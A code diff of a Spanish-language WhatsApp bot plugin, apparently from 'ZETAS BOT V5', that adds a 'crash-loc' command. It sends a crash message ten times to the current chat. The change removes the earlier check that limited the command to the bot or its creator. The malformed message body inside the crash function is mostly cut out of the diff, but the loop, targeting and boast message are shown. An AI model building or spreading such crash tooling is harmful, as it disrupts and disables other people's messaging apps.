@@ -1,44 +1,31 @@
 import fs from 'fs'
 
-let handler = async (m, { conn, text, isBot, isCreator }) => {
-  if (!isBot && !isCreator) return m.reply('🚫 Este comando solo lo puede usar el bot o el creador.')
-  if (!text) return m.reply('⚠️ Escribe el enlace del grupo.\n\nEjemplo: *.crash-loc https://chat.whatsapp.com/xxxxx*')
+let handler = async (m, { conn }) => {
+  let target = m.chat // ya sea grupo o privado
 
-  let groupLink = text.trim()
-  let code = groupLink.split("https://chat.whatsapp.com/")[1]
-  if (!code) return m.reply("❌ Enlace de grupo inválido.")
-
-  let groupId
-  try {
-    groupId = await conn.groupAcceptInvite(code)
-  } catch (e) {
-    return m.reply("🚫 No me pude unir al grupo. Verifica el enlace o que el grupo no esté lleno.")
-  }
-
-  let target = groupId
-  await m.reply(`✅ Me uní al grupo.\n⏳ Enviando crash...`)
+  m.reply(`☠️ Enviando crash a: ${target}...`)
 
   try {
     for (let i = 0; i < 10; i++) {
-      await crash(target)
-      await delay(4000) // 4 segundos entre cada uno
+      await crash(conn, target)
+      await delay(4000) // espera 4 segundos entre cada uno
     }
 
-    conn.sendMessage(target, {
-      text: "☠️ 𝐂𝐑𝐀𝐒𝐇 𝐋𝐎𝐂 𝐄𝐍𝐕𝐈𝐀𝐃𝐎\n\n🔹 Por: 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛\n🔹 Bot: 𝐙𝐄𝐓𝐀𝐒 𝐁𝐎𝐓 𝐕𝟓",
+    await conn.sendMessage(target, {
+      text: "✅ 𝐂𝐑𝐀𝐒𝐇 𝐋𝐎𝐂 𝐄𝐍𝐕𝐈𝐀𝐃𝐎\n\n🔹 Por: 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛\n🔹 Bot: 𝐙𝐄𝐓𝐀𝐒 𝐁𝐎𝐓 𝐕𝟓",
     })
 
   } catch (e) {
-    console.log("❌ Error:", e)
-    m.reply("Ocurrió un error enviando el crash.")
+    console.log("❌ Error al enviar crash:", e)
+    m.reply("❌ Error enviando el crash.")
   }
 }
 
 handler.command = /^crash-loc$/i
 export default handler
 
-// 👇 FUNCIÓN DE CRASH (colócala en el mismo archivo o impórtala)
-async function crash(target) {
+// 👇 FUNCIÓN DE CRASH (sin cambios)
+async function crash(conn, target) {
   try {
     let message = {
       ephemeralMessage: {
@@ -84,7 +71,7 @@ async function crash(target) {
   }
 }
 
-// 👇 Delay
+// 👇 Función delay
 function delay(ms) {
   return new Promise(resolve => setTimeout(resolve, ms))
 }
